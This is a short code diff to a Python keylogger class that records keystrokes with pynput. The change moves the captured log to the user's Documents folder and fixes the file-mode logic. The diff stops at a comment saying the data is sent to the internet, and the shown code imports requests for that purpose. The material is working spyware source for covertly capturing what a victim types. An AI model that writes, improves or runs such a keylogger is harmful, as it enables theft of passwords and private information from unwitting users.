@@ -1,3 +1,4 @@
+from msilib.schema import File
 from pynput.keyboard import Listener
 import requests, os
 
@@ -12,11 +13,11 @@ class KeyLogger:
         log_data = "".join(self.data)
 
         #write the data to local file
-        mode = 'a'
-        if os.path.isfile('log.txt'):
-            mode = 'w'
+        mode = 'w'
+        if os.path.isfile(os.path.expanduser('~\documents\log.txt')):
+            mode = 'a'
 
-        with open('log.txt', mode) as f:
+        with open(os.path.expanduser('~\documents\log.txt'), mode) as f:
             f.write(log_data)
 
         #send data to the internet
